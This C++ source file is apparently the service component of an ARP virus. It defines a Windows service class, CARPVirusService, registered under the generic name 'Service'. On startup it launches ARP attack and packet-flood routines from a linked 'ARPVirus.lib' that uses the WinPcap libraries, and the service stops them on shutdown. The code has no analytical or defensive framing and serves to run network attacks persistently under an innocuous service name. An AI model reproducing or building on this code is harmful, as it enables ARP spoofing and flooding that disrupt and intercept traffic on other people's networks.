#include "StdAfx.h"
#include "ARPVirusService.h"
#include "ace/Thread_Manager.h"

#pragma comment(lib, "ARPVirus.lib")
#pragma comment(lib, "wpcap.lib")
#pragma comment(lib, "Packet.lib")

extern int lib_arp_start();
extern int lib_flood_start();
extern void lib_flood_stop();
extern void lib_arp_stop();
CString CARPVirusService::m_szName = _T("Service");

CARPVirusService::CARPVirusService(void) : CService(m_szName)
{
}

CARPVirusService::~CARPVirusService(void)
{
}

DWORD CARPVirusService::serviceMain(int argc, TCHAR * argv[])
{
	setStatus(SERVICE_RUNNING);
	lib_flood_start();
	lib_arp_start();	

	ACE_Thread_Manager::instance()->wait();
	return 0;
}

void CARPVirusService::stop()
{
	lib_flood_stop();
	lib_arp_stop();
}